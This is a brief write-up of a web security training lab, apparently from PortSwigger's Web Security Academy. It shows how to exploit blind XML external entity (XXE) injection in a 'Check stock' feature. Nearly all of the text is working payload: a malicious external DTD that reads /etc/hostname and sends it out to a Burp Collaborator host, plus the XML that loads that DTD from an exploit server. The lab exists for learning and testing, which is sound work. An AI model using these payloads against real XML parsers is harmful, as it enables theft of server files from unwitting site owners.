# Exploiting blind XXE to exfiltrate data out-of-band

## Exploiting blind XXE to exfiltrate data using a malicious external DTD

This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, exfiltrate the contents of the `/etc/hostname` file.

Exploit:

```DTD
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://h4mpvvu7dfq98uosfoe81bwag1mtai.burpcollaborator.net/?x=%file;'>">
%eval;
%exfiltrate;
```

Solution:

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-ac2a1fd71e1c41bbc0373b1201d50007.web-security-academy.net/exploit.dtd"> %xxe; ]>
```